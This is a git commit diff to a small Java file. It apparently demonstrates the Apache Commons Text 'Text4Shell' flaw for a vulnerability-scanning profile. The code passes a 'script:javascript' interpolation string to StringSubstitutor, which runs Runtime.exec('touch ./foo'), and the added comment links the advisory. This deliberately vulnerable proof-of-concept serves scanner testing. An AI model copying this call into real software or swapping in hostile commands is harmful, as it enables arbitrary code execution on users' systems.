5247912be8a6bc0815dc43409fd74cdce6a62c9b
henrikplate <17928867+henrikplate@users.noreply.github.com>
2022-11-22 18:33:55 +0100

    Added Steady profile to pom.xml and Javadoc

--- src/main/java/Main.java
+++ src/main/java/Main.java
@@ -2,6 +2,9 @@ import org.apache.commons.text.StringSubstitutor;
 
 public class Main {
 
+    /**
+     * @see https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
+     */
     public void print() {
         final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
         String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch ./foo')}");
